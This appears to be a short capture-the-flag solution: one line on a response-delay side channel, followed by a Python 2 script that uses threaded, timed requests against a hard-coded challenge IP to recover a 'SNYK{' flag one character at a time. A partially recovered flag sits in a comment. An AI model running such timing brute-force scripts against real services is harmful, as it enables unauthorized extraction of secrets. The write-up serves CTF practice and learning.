Simple check delay. There are response delay if flag part true

```py
import requests
import string
from time import *
from sys import *
from threading import Thread


class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None,
                 args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs, Verbose)
        self._return = None
    def run(self):
        if self._Thread__target is not None:
            self._return = self._Thread__target(*self._Thread__args,
                                                **self._Thread__kwargs)
    def join(self):
        Thread.join(self)
        return self._return


def tebak(flag, chara):
    burp0_url = "http://35.211.157.218:8000/?flag=" + flag
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

    awal = time()
    x = requests.get(burp0_url, headers=burp0_headers)
    akhir = time()
    return (akhir-awal, chara, flag)


tebakchr = "{_}" +string.letters  + string.digits
# flag = "SNYK{4931f158f356fb38b30998011eac741d89062e7a3b130368b2f724c7d1661c269"
flag = "SNYK{"


for j in range(100):
    kotak = [0 for i in range(len(tebakchr))]
    for i in range(len(tebakchr)):
        kotak[i] = ThreadWithReturnValue(target=tebak, args=(flag + tebakchr[i], tebakchr[i]))
        kotak[i].start()

    for i in kotak:
        val = i.join()
        print val
        if(val[0] > 3):
            flag += val[1] 
            break

```